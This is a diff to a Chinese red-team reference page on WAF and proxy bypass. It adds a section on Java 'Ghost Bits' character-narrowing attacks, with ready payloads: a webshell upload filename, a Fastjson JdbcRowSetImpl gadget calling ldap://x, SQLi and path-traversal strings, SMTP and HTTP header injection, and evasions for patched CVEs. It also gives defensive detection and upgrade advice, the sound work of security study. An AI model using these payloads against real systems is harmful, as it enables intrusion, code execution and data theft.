@@ -19,6 +19,9 @@ related_techniques:
   - xss
   - h2c-smuggling
   - unicode-normalization
+  - ghost-bits-cast-attack
+  - deserialization
+  - crlf-injection
 difficulty: 中级
 tools:
   - nowafpls
@@ -29,7 +32,7 @@ tools:
 
 # Proxy & WAF Protections Bypass — 代理与 WAF 防护绕过
 
-> 关联文档：[HTTP Request Smuggling](../HTTP%20Request%20Smuggling/README.md) · [Web Cache Poisoning & Cache Deception](../Cache%20Poisoning%26Cache%20Deception/README.md) · [File Upload — WAF Bypass](../../Files/File%20Upload/WAF%20Bypass.md) · [XSS](../../User%20input/Reflected%20Values/XSS/README.md) · [基于 Multipart/form-data 换行符差异的通用 WAF 绕过技术](基于%20Multipartform-data%20换行符差异的通用%20WAF%20绕过技术.md)
+> 关联文档：[HTTP Request Smuggling](../HTTP%20Request%20Smuggling/README.md) · [Web Cache Poisoning & Cache Deception](../Cache%20Poisoning%26Cache%20Deception/README.md) · [File Upload — WAF Bypass](../../Files/File%20Upload/WAF%20Bypass.md) · [XSS](../../User%20input/Reflected%20Values/XSS/README.md) · [CRLF 注入](../../User%20input/Reflected%20Values/CRLF/README.md) · [Deserialization](../../User%20input/Structured%20objects/Deserialization/README.md) · [基于 Multipart/form-data 换行符差异的通用 WAF 绕过技术](基于%20Multipartform-data%20换行符差异的通用%20WAF%20绕过技术.md)
 
 ---
 
@@ -43,6 +46,7 @@ WAF 与反向代理的防护逻辑依赖对 HTTP 请求的解析结果。当 WAF
 - **头部解析差异**：畸形头部（如 Line Folding 续行）在一端被忽略、在另一端被合并进头部值。
 - **请求体解析差异**：multipart 边界符、charset、重复参数等语法歧义；或请求体超过 WAF 检查阈值导致完全不检查。
 - **编码归一化差异**：WAF 对用户输入执行深度解码（如 URL 解码 10 次）或 Unicode 归一化，而应用不执行同等级处理，攻击者可在深度编码层隐藏有效 payload。
+- **字符收窄差异**：Java 后端将 16 位 `char` 窄化为 8 位 `byte` 时静默丢弃高位——WAF 看到无害的 Unicode 字符，后端在字节层重建出原始 ASCII 攻击字节（Ghost Bits / Cast Attack，见 # 0x07）。
 
 > **关键点**：绕过成功率取决于**代理层与后端解析器的实现差异**，而非 WAF 规则库本身的缺陷。红队需主动探测目标技术栈的解析特性，而非依赖通用 payload 库。
 
@@ -54,16 +58,18 @@ WAF 与反向代理的防护逻辑依赖对 HTTP 请求的解析结果。当 WAF
 | 请求解析绕过 | # 0x04 | 头部/请求体解析不一致 | AWS WAF、各厂商请求体阈值、CDN 静态资源策略 |
 | Multipart 解析差异 | # 0x05 | 表单语法不等价 | Vercel WAF、阿里云 WAF、ModSecurity |
 | 内容混淆绕过 | # 0x06 | 编码归一化层级差异 | Akamai、Imperva、Cloudflare、正则规则库 |
-| 协议层与基础设施 | # 0x07 | 协议转换差异 / 防护边界外 | H2C、IP 信誉与限速 |
+| 字符收窄绕过 | # 0x07 | char→byte 高位丢失（Ghost Bits） | Java 生态：Tomcat、Spring、Jetty、Fastjson、Jackson、BCEL、HttpClient |
+| 协议层与基础设施 | # 0x08 | 协议转换差异 / 防护边界外 | H2C、IP 信誉与限速 |
 
 ## 1.3 知识路径
 
 ```plaintext
 Proxy & WAF Protections Bypass（本文档）
   ├── 前置知识：HTTP 协议基础、反向代理架构
+  ├── 前置知识：Java char/byte 编码模型（# 0x07 Ghost Bits）
   ├── 下一步：HTTP Request Smuggling（同为解析差异，作用于请求边界）
   ├── 下一步：Web Cache Poisoning（静态资源绕过 + 缓存投毒链）
-  └── 相关：File Upload WAF Bypass、XSS 过滤器绕过
+  └── 相关：File Upload WAF Bypass、XSS 过滤器绕过、CRLF 注入、反序列化
 ```
 
 ---
@@ -218,7 +224,7 @@ WAF 通常只检查一定长度以内的请求体；超过阈值的 POST/PUT/PAT
 | Akamai | 8 KB（默认） | 可通过添加 Advanced Metadata 提升至 128 KB |
 | Cloudflare | 128 KB | 超限不检查 |
 
-攻击链：`确认目标 WAF 平台与阈值` → `发送超大请求体` → `将恶意 payload 置于阈值之后` → `WAF 跳过检查`。工具见 # 0x09 的 nowafpls（Burp 插件，自动向请求填充垃圾数据撑大长度）。
+攻击链：`确认目标 WAF 平台与阈值` → `发送超大请求体` → `将恶意 payload 置于阈值之后` → `WAF 跳过检查`。工具见 # 0x0A 的 nowafpls（Burp 插件，自动向请求填充垃圾数据撑大长度）。
 
 ## 4.3 静态资源检查缺口（.js GET）
 
@@ -526,13 +532,342 @@ data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+ #base64 encoding the javascri
 
 ---
 
-# 0x07 协议层与基础设施绕过
+# 0x07 字符收窄类绕过（Ghost Bits / Cast Attack）
 
-## 7.1 H2C Smuggling
+## 7.1 原理：Java char→byte 高位丢失
+
+来源：Black Hat Asia 2026 演讲 *Cast Attack: A New Threat Posed by Ghost Bits in Java*（[幻灯片 PDF](https://i.blackhat.com/Asia-26/Presentations/Asia-26-Bai-Cast-Attack-Ghost-Bits-4.23.pdf)，演讲者 Xinyu Bai (@b1u3r)、Zhihui Chen (@1ue)，贡献者 Zongzheng Zheng）。静态分析在 GitHub 上发现 **8000+ 处**高危收窄模式。
+
+Java 的 `char` 是 **16 位**无符号整数（UTF-16 代码单元），而 HTTP/1.1、SMTP、Redis RESP、文件路径等传输层全部是 **8 位**字节流。正确的桥接方式是显式字符集编码：
+
+```java
+// 正确：显式 UTF-8，多字节字符变成多字节序列
+byte[] bytes = str.getBytes(StandardCharsets.UTF_8);
+out.write(bytes);
+```
+
+大量遗留代码、框架内部实现与"快速路径"优化跳过这一步，静默窄化：
+
+```java
+// 危险：高 8 位被静默丢弃
+byte b = (byte) ch;          // 0x966A -> 0x6A
+out.write(ch);               // OutputStream.write(int) 只保留低 8 位
+dos.writeBytes(str);         // DataOutputStream 逐字符 cast 写低字节
+int v = ch & 0xFF;           // 显式低字节掩码
+```
+
+丢失的高 8 位即 **Ghost Bits**——把一个多字节 Unicode 字符在协议层变成攻击者挑选的单个 ASCII 字节：
+
+```plaintext
+视图 A（字符串层：WAF / 业务校验 / 日志）
+  看到：陪 阮 严 灵 瘍 瘊 ...   "无害 Unicode 乱码，放行"
+                  |
+                  v       调用栈中某处的静默窄化
+视图 B（字节层：协议 / 文件系统 / 解析器 / 类加载器）
+  看到：j  .  %  u  \r \n ...  "执行危险语义"
+```
+
+数学公式：要让视图 B 看到字节 `T`，任选 `k ∈ 0x01..0xFF`：
+
+```plaintext
+c = chr((k << 8) | T)
+```
+
+每个危险字节有 **255 个候选 Unicode 字符**——足够躲过任何基于签名的黑名单。与 # 0x06 的 Unicode 兼容归一化（NFKC 等）方向相反：那里是"兼容字符折叠成 ASCII"的正规映射，这里是"任意字符的低 8 位等于目标字节"的算术构造，WAF 无法通过标准归一化预判。
+
+## 7.2 三大根因家族
+
+| 家族 | 根因 | 典型代码 / 行为 | 典型受害者 |
+|------|------|-----------------|-----------|
+| A — 真实高位截断 | 窄化是无条件且字面的 | `(byte) ch`、`ch & 0xFF`、`OutputStream.write(int)`、`DataOutputStream.writeBytes` | Tomcat `filename*`、BCEL ClassLoader、Lettuce、Angus Mail、HttpClient |
+| B — 位运算折叠 | "快速" hex/base64 解码器用位技巧替代严格范围校验，非法字符折叠成合法值 | Jetty `TypeUtil.fromHexDigit` | Openfire、GeoServer、通用 URL 解码 |
+| C — Unicode 宽松归一化 | 解码器接受本不该参与协议解析的 Unicode 字符 | `Character.digit(c, 16)`、Jackson `sHexValues[ch & 0xff]`、全角数字 | Fastjson、Jackson、JDK URLDecoder |
+
+Family B 实例——Jetty `TypeUtil.fromHexDigit`（简化）：
+
+```java
+private static int fromHexDigit(char c) {
+    int x = c & 0x1F;          // 保留低 5 位
+    x += (c >> 6) * 25;
+    x -= 16;
+    return x;                  // 预期 0..15，但无范围校验
+}
+```
+
+以 `>`（0x3E）为例：`0x3E & 0x1F = 30`，`(0x3E >> 6) * 25 = 0`，`30 + 0 - 16 = 14 = 0xE`。因此 **`%2>` 被静默解析为 `%2E`（`.`）**。同样的代数使 `%2^`、`%2~` 等价于其他 hex 数字（可见字符中明显的折叠特征：`9=`、`@9`、`` `a ``、`:b`、`;c`、`<d`、`=e`、`>f`、`?g`）。
+
+## 7.3 危险字节 → Ghost 字符映射表
+
+| 目标字节 | Hex | 用途 | Ghost 字符 | 码点 |
+|----------|-----|------|------------|------|
+| `\t` | 0x09 | 头部续行、解析器混淆 | `ĉ` | U+0109 |
+| `\n` | 0x0A | CRLF 注入、日志注入 | `瘊` | U+760A |
+| `\r` | 0x0D | CRLF 注入、请求走私 | `瘍` | U+760D |
+| ` ` | 0x20 | 头部断开、命令分隔 | `Ġ` | U+0120 |
+| `"` | 0x22 | JSON / quoted-printable 断串 | `Ģ` | U+0122 |
+| `%` | 0x25 | URL 编码前缀、二次解码 | `严` | U+4E25 |
+| `&` | 0x26 | 参数分隔符 | `Ȧ` | U+0226 |
+| `'` | 0x27 | SQL 断串 | `ȧ` | U+0227 |
+| `.` | 0x2E | 路径穿越、扩展名 | `阮` | U+962E |
+| `/` | 0x2F | 路径分隔符 | `丯` | U+4E2F |
+| `0`-`3` | 0x30-33 | hex 数字构造 | `丰` `失` `甲` `耳` | U+4E30 等 |
+| `;` | 0x3B | 命令分隔、头部续行 | `Ȼ` | U+023B |
+| `<` / `>` | 0x3C/3E | XSS / XML 标签 | `ȼ` / `Ⱦ` | U+023C/3E |
+| `=` | 0x3D | 参数 / 头值赋值 | `Ƚ` | U+023D |
+| `@` | 0x40 | Fastjson `@type`、邮件地址 | `ŀ` | U+0140 |
+| `a` `c` `l` `s` | — | 关键字 `class` | `ᙡ` `㹣` `౬` `⑳` | U+1661/3E63/0C6C/2473 |
+| `e` | 0x65 | hex 数字 | `来` | U+6765 |
+| `j` | 0x6A | 扩展名 `.jsp` | `陪` | U+966A |
+| `n` `t` `u` | — | 关键字 `Runtime`、`\u` 转义引入符 | `陮` `Ŵ` `灵` | U+966E/0174/7075 |
+
+选型指引：避开代理项范围 `0xD800..0xDFFF`（高字节 0xD8..0xDF，非合法标量值会被 JVM 字符串解码器替换，破坏绕过）；Latin Extended-A 变体 UTF-8 展开小（2 字节），适合紧凑的 HTTP 头上下文；CJK 变体（3 字节）偏向让 WAF 的"这只是一段文本"分类器放行；跨请求轮换 `k` 防止自适应学习固定映射。
+
+## 7.4 分组件利用配方
+
+### 7.4.1 Tomcat `RFC2231Utility` — 文件上传 Webshell（Family A）
+
+任何接受 multipart 上传且 Tomcat 解析 `Content-Disposition: ... filename*=UTF-8''...` 的端点。Tomcat 的 RFC2231 解码器把每个非百分号字符直接 cast 为 byte，丢弃高 8 位：
+
+```http
+Content-Disposition: attachment; filename*=UTF-8''1.陪sp
+```
+
+| 阶段 | 看到的文件名 |
+|------|-------------|
+| WAF / 扩展名过滤 | `1.陪sp`（非 `.jsp`，放行） |
+| Tomcat RFC2231 解码器 | `陪` → 低字节 0x6A → `j` |
+| 文件系统 | `1.jsp` |
+
+`filename*` 还支持 URL 编码（`1.%6asp`），其解码算法为 `ch & 0x7f`——**双重 Ghost Bits**（如 `1.%鸶繡sp`）。同理，在开启 `allowCasualMultipartParsing` 时可用于隐藏参数名（不能隐藏值），是 CVE-2022-22965 的经典利用路径。更多文件上传混淆手法见 [File Upload — WAF Bypass](../../Files/File%20Upload/WAF%20Bypass.md)。
+
+### 7.4.2 Apache Commons BCEL — ClassLoader RCE（Family A）
+
+任何以 `$$BCEL$$...` 解析类名、或经 `JavaReader` → `ByteArrayOutputStream` 循环解码 BCEL 的 sink：
+
+```java
+ByteArrayOutputStream bos = new ByteArrayOutputStream();
+JavaReader jr = new JavaReader(new CharArrayReader(userChars));
+while ((ch = jr.read()) >= 0) {
+    bos.write(ch);     // 只保留低 8 位
+}
+```
+
+把恶意 BCEL 字节码的每个字节包进一个低 8 位相等的 Unicode 字符：解码出的字节流是合法 BCEL class，WAF 看到的是一长串无 `$$BCEL$$` 关键字、无 class 签名的 CJK 文本。防守方若要在 WAF 检测 BCEL，必须先复刻 `bos.write(ch)` 语义再做模式匹配。BCEL / 反序列化链的通用背景见 [Deserialization](../../User%20input/Structured%20objects/Deserialization/README.md)。
+
+### 7.4.3 Jackson `charToHex` — SQLi 走私（Family C）
+
+任何 Jackson 解析的 JSON 字段值后续被嵌入 SQL 或其他解析器时，Jackson 对 `\uXXXX` 数字的解析：
+
+```java
+private static final int[] sHexValues = new int[128];
+public static int charToHex(int ch) {
+    return sHexValues[ch & 0xFF];   // 先掩码，后查表
+}
+```
+
+任何低 8 位落在已填充索引上的非 ASCII 字符都返回该 hex 数字。走私数字 `1`（UNION 列数探测）：
+
+```json
+{"q": "\u丰丰耳失 union select 1,2,3 -- "}
+```
+
+| 视图 | 内容 |
+|------|------|
+| WAF | `\u丰丰耳失 union select ...`（无前导数字） |
+| Jackson | `1 union select 1,2,3-- ` → `1 union select…` |
+
+> **限制**：`ch` 来自 `_inputBuffer`——本地测试走 `ReaderBasedJsonParser`（`char[]` 缓冲，可利用）；**Spring Boot 默认使用 `UTF8StreamJsonParser`（`byte[]` 缓冲），不可利用**。需确认目标实际解析路径。
+
+### 7.4.4 Fastjson `\u` / `\x` 转义绕过（Family B + C）
+
+两个独立面：
+
+(a) `\x` 转义——Fastjson 计算 `digits[x1] * 16 + digits[x2]`，`digits` 表只在 `0-9A-Fa-f` 处填充，**未填充索引静默返回 0**（`\x4_` → `4*16+0 = 0x40 = '@'`）：
+
+```json
+{"\x4_type": "com.sun.rowset.JdbcRowSetImpl", "dataSourceName": "ldap://x"}
+```
+
+(b) `\u` 转义——`Character.digit(c, 16)` 接受 ASCII 之外的 Unicode 数字类别（泰文 `๐-๙` U+0E50、旁遮普文 `੦-੯` U+0A66、全角 `０-９` U+FF10）：
+
+```json
+{"\u４_type": "com.sun.rowset.JdbcRowSetImpl", "dataSourceName": "ldap://x"}
+```
+
+| 视图 | 字段名 |
+|------|--------|
+| WAF | `\x4_type` / `\u４_type`（无 `@type` 字面量） |
+| Fastjson | `@type` → JdbcRowSetImpl autotype gadget 触发 |
+
+> 实测提示：此类 payload 建议经 Yakit 发送，Burp Suite 的编码处理可能破坏绕过效果。
+
+### 7.4.5 Spring / Jetty / Undertow / Vert.x — URL 解码（Family A + B）
+
+两个可组合的招式：
+
+Trick 1 — Family A 字符替换（路径或查询参数）：
+
+```plaintext
+/api/v1/data?file=阮丯阮丯etc丯passwd
+                = ../../etc/passwd（字节层）
+```
+
+Trick 2 — Family B `%2>` 折叠（当链路中存在 Jetty `TypeUtil.fromHexDigit`）：
+
+```plaintext
+/setup/setup-s/%2>%2>/log.jsp
+                = /setup/setup-s/../log.jsp（解码后）
+```
+
+**Spring CVE-2025-41242 全链**（任意文件读取，`StringUtils.uriDecode` 修复于 PR #34673，vulhub 靶场见参考资料）：`StringUtils.uriDecode` 逐段解码路径并 `baos.write(ch)` 收窄，但 **`changed` 必须为 true 才会输出解码结果**——因此单独 `/阮严灵丰丰甲来/` 不触发 Ghost Bits，payload 中至少需要一个真实 `%XX`（如结尾的 `%64`）：
+
+```plaintext
+/阮严灵丰丰甲来/阮严灵丰丰甲来/阮严灵丰丰甲来/etc/passw%64
+```
+
+| 阶段 | 路径 |
+|------|------|
+| Spring `isInvalidPath()` | `.%u002e` — 无字面 `..`，放行 |
+| `PathResource.resolve()` 的 normalizePath 检测 | 同样不识别 `%u002e` |
+| `URIUtil.encodePathSafeEncoding` | 处理 `%u002e` → `%2e`（该处前置 `TypeUtil.isHex` 校验，无法二次变形） |
+| 后端文件解析 | `..` → 穿越读取 |
+
+### 7.4.6 Angus Mail / Jakarta Mail — SMTP 注入（Family A）
+
+任何从用户可控字符串构建 SMTP 信封或头部的应用。内部 `ASCIIUtility` 执行 `byte b = (byte) ch;`。用 `瘍瘊` 走私 CRLF：
+
+```plaintext
+hacker@evil.com瘍瘊Subject: Password reset code瘍瘊To: target@victim.com瘍瘊瘍瘊Your code is 1234
+```
+
+| 视图 | 解析结果 |
+|------|---------|
+| 应用校验 | 单个含怪 CJK 的 `From` 值 |
+| SMTP 服务器 | 五条独立头部 + 正文，完全伪造 |
+
+对应 **CVE-2025-7962**（Eclipse Angus Mail / Jakarta Mail SMTP 注入，受影响 ≤ 2.0.3，修复于 2.0.4，报告者正是演讲作者 1ue/blu3r）。真实影响链：Atlassian Jira 类密码重置劫持与 Confluence 域白名单绕过（**CVE-2025-57733**，影响 Jira/Confluence/Bitbucket/Keycloak/TeamCity）——邮件以合法 SPF/DKIM/DMARC 离开企业 SMTP 服务器，但 `To:` 与 `Subject:` 由攻击者选定，高保真钓鱼。CRLF 的通用原理见 [CRLF 注入](../../User%20input/Reflected%20Values/CRLF/README.md)。
+
+### 7.4.7 Apache HttpClient `<= 4.5.9` — 请求走私（Family A）
+
+HTTPCLIENT-1974 / HTTPCLIENT-1978：头值经过 `OutputStreamWriter` 加窄化写路径，`瘍瘊` 被发射为裸 `\r\n`：
+
+```http
+X-Auth-Token: 1瘍瘊POST /admin HTTP/1.1\r\nHost: internal\r\nContent-Length: 0\r\n\r\nGET /public HTTP/1.1
+```
+
+| 跳数 | 所见 |
+|------|------|
+| 前置代理 / WAF | 一个带超长 `X-Auth-Token` 的请求 |
+| 源站 | 两个请求；第二个是 admin POST |
+
+确认 desync 后的 chosen-prefix 攻击见 [HTTP Request Smuggling](../HTTP%20Request%20Smuggling/README.md)。
+
+### 7.4.8 JDK HttpServer — 响应拆分（CVE-2026-21933，Family A）
+
+用户输入反射进响应头时经过 `com.sun.net.httpserver` 的逐字符低字节写入。**CVE-2026-21933**（2026-01 Oracle CPU 披露，受影响 8u471 / 11.0.29 / 17.0.17 / 21.0.9 / 25.0.1，报告者 Zhihui Chen）：
+
+```http
+Custom: Cu瘍瘊Content-Type: text/html瘍瘊Content-Length: 33瘍瘊瘍瘊<script>alert(1)</script>
+```
+
+服务器发出两个逻辑响应，第二个携带攻击者选定的正文——可升级为存储型 XSS、缓存投毒与 SSO 重定向链。
+
+### 7.4.9 其他组件与负向结论
+
+同一 Family A 原语的不同 sink：**Lettuce**（Redis 客户端，RESP 帧走私 `\r\n` → 任意 `CONFIG SET dir` + `SAVE`，SSRF-to-RCE）、**Jodd `FileNameUtil`**（`阮`/`丯` 路径穿越）、**XMLWriter**（属性/文本节点注入标签名，XXE/XSS 支点）、**ActiveJ HTTP**（与 7.4.7/7.4.8 同形 CRLF）、**Vert.x `MultipartParser`**（Family A）。
+
+负向结论（有校验、不可利用，测试前不必浪费时间）：**Nashorn** 的 `Lexer.convertDigit()` 限制严格；**JSP（Jasper）** 的 `Scanner.getHexadecimalValue()` 有校验。
+
+## 7.5 已修复 CVE 的再激活配方
+
+在对应 CVE 已打补丁、但 WAF 仍前置时使用——把原始 ASCII 攻击平移进字符串规则看不见的形态：
+
+**Openfire CVE-2023-32315（认证绕过，Family B）**——公开绕过是 `/setup/setup-s/%u002e%u002e/%u002e%u002e/log.jsp`（WAF 普遍覆盖）；Ghost Bits `%2>` 折叠变体更难签名：
+
+```http
+GET /setup/setup-s/%2>%2>/%2>%2>/log.jsp
+```
+
+**GeoServer CVE-2024-36401（RCE，Family B）**——公开 WAF 规则通常封堵 `Runtime`，注入一个折叠字符：
+
+```plaintext
+Ru%6>time      # %6> -> %6E -> n；表达式求值器看到 Runtime，WAF 从未看到
+```
+
+**Spring4Shell CVE-2022-22965（类加载链，Family A）**——必需参数前缀 `class.module.classLoader...`：
+
+```http
+Content-Disposition: form-data; name*="㹣౬ᙡ⑳⑳.module.classLoader.resources..."
+```
+
+| 字符 | Ghost | 码点 | 低字节 |
+|------|-------|------|--------|
+| `c` | `㹣` | U+3E63 | 0x63 |
+| `l` | `౬` | U+0C6C | 0x6C |
+| `a` | `ᙡ` | U+1661 | 0x61 |
+| `s` | `⑳` | U+2473 | 0x73 |
+
+Spring 的参数名解析器窄化回 `class`。
+
+**Spring CVE-2025-41242 / JDK CVE-2026-21933 / Angus Mail CVE-2025-7962** — 见 §7.4.5 / §7.4.8 / §7.4.6（后两者本身即 Ghost Bits 类漏洞，报告者即本技术演讲作者）。
+
+## 7.6 探测决策树与字符生成器
+
+```plaintext
+后端是 Java？（Server 头、错误页、JSESSIONID、.do/.action、X-Powered-By）
+├── 否 → 停止，Ghost Bits 不适用
+└── 是 → 存在 WAF / IDS / 输入过滤封堵字面 payload？
+    ├── 否 → 直接用字面 payload
+    └── 是 → 按 sink 路由：
+        multipart 上传 → §7.4.1；JSON 反序列化 → §7.4.3/7.4.4
+        ClassLoader/BCEL → §7.4.2；URL 路径/参数 → §7.4.5 + %2> 折叠
+        头反射 → §7.4.7/7.4.8；邮件发送 → §7.4.6；Redis/XML → §7.4.9
+        ↓
+        先做单字符非破坏替换探测（只替换一个被封字符为 Ghost 变体，
+        对比状态码 / 长度 / 头回显 / 报错 / 时间）
+        ↓
+        出现可观测差异 → 全量替换 + 链接对应攻击 playbook
+```
+
+```python
+def ghost(target_byte: int, k: int = 1) -> str:
+    """返回低 8 位等于 target_byte 的 Unicode 字符"""
+    if 0xD8 <= k <= 0xDF:            # 代理项范围，另选 k
+        raise ValueError("surrogate range")
+    return chr(((k & 0xFF) << 8) | (target_byte & 0xFF))
+
+ghost(0x6A, 0x96)   # '陪' —— 255 个候选每字节，跨请求轮换 k
+```
+
+## 7.7 防御与检测
+
+**代码层**：禁止手写 `(byte) ch`、`& 0xFF`、`out.write(ch)`、`writeBytes`；协议字段一律 `getBytes(StandardCharsets.UTF_8)` 或严格 ASCII 白名单。
+
+**解码器层**：拒绝非法输入——不得把未知 hex / Unicode 数字 / Base64 字符默认折叠为 0 或低 8 位。
+
+**校验顺序**：先归一化后校验——严格解码 → Unicode NFC/NFKC → 协议归一化（URL `..` 解析、`File.getCanonicalPath`）→ 安全检查 → 执行。
+
+**WAF 多视图归一化**：同时检查原始字符串、`(char) & 0xFF` 视图、URL 解码视图、Unicode-NFKC 视图（含 Jetty lax-hex 语义与 Fastjson `\x` 默认 0 语义的复刻）；任一非原始视图出现危险语义即告警：
+
+```python
+ALERT IF:
+    DANGEROUS_TOKEN 匹配于  { low_byte 视图 ∪ url_lax_hex 视图 ∪ \u 转义视图 }
+    AND DANGEROUS_TOKEN 不匹配于 raw 视图
+```
+
+**升级矩阵**：Apache Commons BCEL ≥ 6.12.0；Apache HttpClient ≥ 4.5.10 或迁移 5.x；Angus Mail ≥ 2.0.4；Openfire ≥ 4.7.5 / 4.6.8 / 4.8.x；GeoServer ≥ 2.28.3；JDK 升级修复版本（8/11/17/21/25 均有 fix commit）；Fastjson 升级 2.x 最新版；Tomcat/Spring/Jetty/Undertow 按厂商公告升级。
+
+**蓝队迹象**：协议语法位置（文件名、头值、邮件地址）出现 CJK / Latin-Extended 字符；请求 hex dump 在协议定界符旁出现 `0x20..0x7E` 之外的字节；扫描器报"奇怪 200"而监控未告警——Java 栈中 2025-2026 该模式最常见原因即 Ghost Bits。SAST 首轮 grep：`\(byte\)\s*\w+`、`& 0[xX][fF][fF]`、`writeBytes`、`Character\.digit`、`fromHexDigit`、`charToHex`、`uriDecode`。
+
+---
+
+# 0x08 协议层与基础设施绕过
+
+## 8.1 H2C Smuggling
 
 利用 HTTP/1.1 与 HTTP/2 转换层（h2c upgrade）的头部解析差异，将请求走私穿过 WAF/前端代理到达后端。需结合目标前端协议栈特性（如 Nginx + Tomcat 组合）。协议升级层的同类机制与实战细节见 [Upgrade Header Smuggling](../Upgrade%20Header%20Smuggling/README.md)。
 
-## 7.2 IP 轮换
+## 8.2 IP 轮换
 
 基于 IP 的限速与封禁是 WAF 的常见全局规则，可通过云 API Gateway 动态轮换出口 IP 规避：
 
@@ -545,9 +880,9 @@ data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+ #base64 encoding the javascri
 
 ---
 
-# 0x08 防御与检测
+# 0x09 防御与检测
 
-## 8.1 加固建议
+## 9.1 加固建议
 
 1. **Nginx ACL 避免精确匹配**：`location = /path` 存在系统性绕过风险，使用 `location ~* ^/admin { deny all; }` 正则前缀匹配，并确保代理层与后端使用一致的路径规范化逻辑。
 2. **升级与补丁**：ModSecurity v3 升级至 ≥ 3.0.12（CVE-2024-1019）；v2 无补丁，避免在规则中单独依赖 `REQUEST_FILENAME`/`REQUEST_BASENAME`/`PATH_INFO`。
@@ -556,18 +891,20 @@ data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+ #base64 encoding the javascri
 5. **归一化顺序**：Unicode 归一化（NFKC/NFKD）与 URL 解码必须先于安全检测执行；限制解码深度（如仅 1 次），与应用实际行为对齐。
 6. **静态资源一致策略**：对 `.js`/`.css` 等静态路径的 GET 请求应用与动态请求一致的头部内容检查，谨慎对待基于静态扩展名的缓存自动透传。
 7. **内联检查深度**：事件处理器检查需解析全部语句而非仅首条；将 `;` 后的语句纳入检测。
+8. **字符收窄防护**：WAF 对 Java 后端做多视图归一化（原始 / 低 8 位 / NFKC / URL 解码视图并行检查）；协议字段用严格 ASCII 白名单；依赖升级按 # 0x07 §7.7 矩阵执行。
 
-## 8.2 检测方法
+## 9.2 检测方法
 
 - 监控含非常规控制字符（`\x85`、`\xA0`、`\x1F`–`\x0B`、`\x09`、`\x0C`）的请求路径，与 matrix 参数 `;` 出现在路径段开头（如 `;1337/api/...`、`;@evil.com/url`）的请求。
 - 告警头部值中的 tab/空格续行（Line Folding）模式。
 - 监控超过 WAF 检查阈值且 `Content-Length` 异常的 POST/PUT/PATCH。
 - multipart 请求中：重复 `boundary=`、多个 `Content-Type`、部件级非 utf8 charset、结束标记尾空格、`\n` 单独作分隔符——任一出现即标记。
 - 对编码深度异常（同一参数被多次 URL 编码、Unicode 兼容字符混入 ASCII 上下文）的输入做回溯审计。
+- 协议语法位置（文件名、头值、邮件地址）出现 CJK / Latin-Extended 字符，且请求 hex dump 在协议定界符旁有 `0x20..0x7E` 之外字节——Ghost Bits 典型特征（# 0x07 §7.7）。
 
 ---
 
-# 0x09 工具
+# 0x0A 工具
 
 | 工具 | 用途 |
 |------|------|
@@ -598,3 +935,7 @@ data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+ #base64 encoding the javascri
 - [5 Ways I Bypassed Your WAF — allypetitt (Medium)](https://medium.com/@allypetitt/5-ways-i-bypassed-your-web-application-firewall-waf-43852a43a1c2)
 - [Unicode 兼容字符查询表 — compart.com](https://www.compart.com/en/unicode)
 - [WAF 绕过技术全景（视频）](https://www.youtube.com/watch?v=0OMmWtU2Y_g)
+- [Cast Attack: A New Threat Posed by Ghost Bits in Java — Black Hat Asia 2026 幻灯片](https://i.blackhat.com/Asia-26/Presentations/Asia-26-Bai-Cast-Attack-Ghost-Bits-4.23.pdf)（# 0x07 原始研究；演讲者 Xinyu Bai、Zhihui Chen，贡献者 Zongzheng Zheng）
+- [Ghost Bits 详解 — 珂技知识分享（gm7.org 转载）](https://www.gm7.org/archives/111309)（fastjson/jackson/BCEL/tomcat/URLDecoder/jetty/spring/httpClient 逐组件源码级分析，含负向结论）
+- [Cast Attack: ghost bits in Java as a new class of parser differential attacks — dbugs](https://dbugs.ptsecurity.com/news/cast-attack-ghost-bits-in-java-as-a-new-class-of-parser-differential-attacks-20260505)
+- [vulhub — Spring CVE-2025-41242 复现环境](https://github.com/vulhub/vulhub/blob/master/spring/CVE-2025-41242/README.zh-cn.md)
